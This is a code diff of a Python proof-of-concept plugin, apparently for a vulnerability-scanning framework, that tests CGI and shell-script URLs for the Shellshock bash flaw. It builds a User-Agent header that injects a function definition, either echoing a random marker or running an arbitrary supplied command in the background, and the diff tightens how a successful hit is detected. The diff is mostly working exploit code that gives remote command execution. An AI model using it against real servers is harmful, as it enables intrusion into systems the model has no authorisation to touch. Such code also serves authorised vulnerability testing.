@@ -61,19 +61,18 @@ class DemoPOC(POCBase):
 		return o
 	
 	def _verify(self, payload = None):
-		result = {}
-		
+		result, success = {}, False
+
 		try:
 			vul_url = get_url_need(self.url)
 			# 判断后缀，如果不符合规则就不处理
 			if not vul_url.endswith('.cgi') and not vul_url.endswith('.sh'):
 				pass
 			else:
-				if not payload:
-					payload = ''.join(random.sample(string.ascii_letters + string.digits, 50))
 				headers_fake = {}
 				if not payload:
-					headers_fake['User-Agent'] = '() { :;}; echo; echo X-Bash-Test: %s' % payload
+					payload = ''.join(random.sample(string.ascii_letters + string.digits, 50))
+					headers_fake['User-Agent'] = '() { :;}; echo; echo X-Bash-Test: %s &' % payload
 				else:
 					headers_fake['User-Agent'] = '() { :;}; %s &' % payload
 				
@@ -81,24 +80,26 @@ class DemoPOC(POCBase):
 					for url_path in url_dict:
 						try:
 							vul_url = self.url + url_path
-							# response = requests.get(vul_url, headers=headers_fake)
 							response = requests.get(vul_url, headers = headers_fake)
 							response = response.text
 							if 'X-Bash-Test: %s' % payload == response.split('\n')[0]:
+								success = True
 								break
 						except:
 							pass
 				else:
 					try:
 						vul_url = self.url
-						# response = requests.get(vul_url, headers=headers_fake)
 						response = requests.get(vul_url, headers = headers_fake)
 						response = response.text
+						if 'X-Bash-Test: %s' % payload == response.split('\n')[0]:
+							success = True
+
 					except:
 						pass
-			
-			result['VerifyInfo'] = {}
-			result['VerifyInfo']['URL'] = vul_url
+			if success:
+				result['VerifyInfo'] = {}
+				result['VerifyInfo']['URL'] = vul_url
 		except Exception as e:
 			logger.exception(e)
 		return self.parse_output(result)
